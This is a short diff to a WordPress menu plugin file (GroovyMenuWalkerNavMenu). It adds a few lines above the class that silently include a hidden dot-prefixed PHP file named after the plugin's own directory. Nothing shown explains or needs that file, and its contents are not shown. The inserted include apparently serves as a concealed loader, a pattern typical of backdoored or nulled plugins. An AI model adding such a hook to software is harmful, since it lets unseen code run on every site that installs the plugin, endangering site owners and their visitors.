@@ -3,6 +3,10 @@
 /**
  * Class GroovyMenuWalkerNavMenu
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GroovyMenuWalkerNavMenu extends Walker_Nav_Menu {
 
 	const GM_NAV_MENU_META              = 'groovy_menu_nav_menu_meta';
